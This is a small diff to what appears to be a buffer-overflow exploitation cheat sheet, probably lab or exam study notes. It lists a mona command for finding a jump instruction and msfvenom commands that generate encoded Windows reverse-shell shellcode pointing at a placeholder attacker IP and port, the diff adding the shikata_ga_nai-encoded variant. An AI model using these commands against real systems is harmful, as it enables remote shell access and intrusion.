@@ -30,6 +30,7 @@
 		- !mona find -s "\xff\xe2" -m "modulename"
 - Generate Shell Code
 	- msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port EXITFUNC=thread -b "\x00\x0a" -f py
+	- msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a"
 - Exploit
 	- final-exploit.py
 
